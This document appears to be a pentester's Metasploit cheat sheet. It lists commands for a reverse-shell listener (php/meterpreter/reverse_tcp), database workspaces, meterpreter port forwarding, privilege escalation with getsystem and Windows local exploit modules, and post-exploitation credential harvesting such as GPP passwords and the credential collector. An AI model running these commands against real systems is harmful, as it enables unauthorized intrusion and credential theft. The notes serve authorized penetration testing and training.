# Metasploit:

* start metasploit and postgres services
* start metasploit without splash: msfconsole -q
* first time
  ```
  msfdb init
  msfdb start
  ```

### Multi Handler

* Start multi listener:
  ```
  msf > use exploit/multi/handler
  msf exploit(handler) >
  msf exploit(handler) > set payload php/meterpreter/reverse_tcp
  payload => php/meterpreter/reverse_tcpexploitn
  msf exploit(handler) > set LHOST 192.168.56.103
  LHOST => 192.168.56.103
  msf exploit(handler) > set LPORT 443
  LPORT => 443
  msf exploit(handler) > exploit
  ```

### General
* Organise related data by using a workspace
  [Using the Database in Metasploit](https://www.offensive-security.com/metasploit-unleashed/using-databases/)
  ```
  msf > help workspace
  Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r <old> <new>   Rename workspace
    workspace -h               Show this help information
  ```

* Import nmap XML file
  ```
  msf > db_import [nmap_file_name].xml
  ```

* Check the details in a current database (workspace)
  [Using the Database in Metasploit](https://www.offensive-security.com/metasploit-unleashed/using-databases/)
  ```
  msf > hosts
  msf > hosts -c address,os_name
  msf > hosts -c address,os_name -S Linux   # Show IP address, OS name and only list Linux
  msf > services -u                         # List services that are up
  msf > services -s http -c port 172.16.194.134  
  msf> services -u -S web                   # Show services that are up and contains web
  msf> services -p 443 -u -S apache -R      # Set RHOSTS, all hosts that have open port 443 and running "Apache" service
  msf > creds                               # List all
  msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::   # Add when found during post-exploitation
  ```

  Help
  ```
  > services -h

  Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

    -a,--add          Add the services instead of searching
    -d,--delete       Delete the services instead of searching
    -c <col1,col2>    Only show the given columns
    -h,--help         Show this help information
    -s <name1,name2>  Search for a list of service names
    -p <port1,port2>  Search for a list of ports
    -r <protocol>     Only show [tcp|udp] services
    -u,--up           Only show services which are up
    -o <file>         Send output to a file in csv format
    -O <column>       Order rows by specified column number
    -R,--rhosts       Set RHOSTS from the results of the search
    -S,--search       Search string to filter by

  Available columns: created_at, info, name, port, proto, state, updated_at
  ```

### Meterpreter

* See **Post Exploitation** [BELOW]

* Port forward using meterpreter
  ```
  portfwd add -l <attacker port> -p <victim port> -r <victim ip>
  portfwd add -l 3306 -p 3306 -r 192.168.1.101
  ```

### Post Exploitation

* Meterpreter, get SYSTEM
  ```
  getsystem
  ```

* Local exploitation, meterpreter:
  ```
  > background            #meterpreter session to background
  [*] Backgrounding session 1...

  > use exploit/windows/local/
  ...snip...
  use exploit/windows/local/bypassuac
  use exploit/windows/local/bypassuac_injection
  ...snip...
  use exploit/windows/local/ms10_015_kitrap0d
  use exploit/windows/local/ms10_092_schelevator
  use exploit/windows/local/ms11_080_afdjoinleaf
  use exploit/windows/local/ms13_005_hwnd_broadcast
  use exploit/windows/local/ms13_081_track_popup_menu
  ...snip...
  ```


* Get Windows Hotfixes and Patches
  ```
  post/windows/gather/enum_patches
  ```

* Get unattended installation credentials
  ```
  post/windows/gather/enum_unattend
  ```

* Get Windows Gather Group Policy Preference Saved Passwords
  ```
  post/windows/gather/credentials/gpp
  ```
* Others
  ```
  use exploit/windows/local/service_permissions

  post/windows/gather/credentials/gpp

  run post/windows/gather/credential_collector

  run post/multi/recon/local_exploit_suggester

  run post/windows/gather/enum_shares

  run post/windows/gather/enum_snmp

  run post/windows/gather/enum_applications

  run post/windows/gather/enum_logged_on_users

  run post/windows/gather/checkvm
  ```
https://www.offensive-security.com/metasploit-unleashed/windows-post-gather-modules/

Get passwords
http://www.hackingarticles.in/post-exploitation-remote-windows-password/

* Scraper
```
> run scraper

> run winenum
```

* Hashdump

* Credential collector
```
meterpreter > run post/windows/gather/credentials/credential_collector
```

* Applications
```
meterpreter > run post/windows/gather/enum_applications
```
